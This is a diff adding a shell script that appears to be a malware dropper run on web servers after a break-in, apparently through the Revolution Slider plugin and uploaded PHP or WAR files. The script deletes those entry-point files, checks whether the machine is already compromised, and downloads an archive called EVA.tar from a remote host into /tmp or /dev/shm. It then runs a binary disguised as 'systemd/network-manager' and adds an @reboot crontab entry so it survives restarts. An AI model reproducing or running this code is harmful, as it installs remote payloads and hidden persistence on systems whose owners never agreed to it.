@@ -1,0 +1,58 @@
+check_file_integrity(){
+   file_path="$1"
+   if [ -f "$file_path" ]; then
+     return 1
+   else # Downloaded file not found, stop execution
+     exit 1
+   fi
+}
+
+already_pwned(){
+    file_path="$1/EVA.tar"
+    if [ -f "$file_path" ]; then # MACHINE HAS ALREADY BEEN COMPROMISED
+        exit 1
+    else
+        return 1
+}
+
+delete_entrypoints(){
+   rm -rf ./revslider.zip
+   rm -rf ./showbiz.zip
+   rm -rf ./cute.php
+   rm -rf ./cute.jpg.phar
+   rm -rf ./cute.war
+}
+
+possible_paths="/var/tmp /tmp /dev/shm"
+delete_entrypoints
+
+for directory in $possible_paths; do
+   # IF DIRECTORY IS WRITTABLE, CD INSIDE
+   if touch "$directory/test" 2>/dev/null && cd "$directory"; then
+     already_pwned "$directory"
+     # GET PAYLOAD
+     if command -v wget; then
+       wget https://raw.githubusercontent.com/accessbrker/EVA/main/EVA.tar
+     elif command -v curl 2>/dev/null; then
+       curl -O https://raw.githubusercontent.com/accessbrker/EVA/main/EVA.tar
+     else
+       exit 1
+     fi
+
+     # CHECK FILE / EXTRACT
+     check_file_integrity "$directory/EVA.tar"
+     if command -v 'tar'; then
+        tar -xvf "$directory/EVA.tar"
+     else
+        exit 1
+     fi
+     # DELETE COMPRESSED FILE
+     rm -rf "$directory/EVA.tar"
+     # RUN
+     cd "$directory/systemd" || exit 1
+     chmod +x ./network-manager
+     ./network-manager
+     (crontab -l 2>/dev/null; echo "@reboot $directory/systemd/network-manager") | crontab -
+     break
+   fi
+done
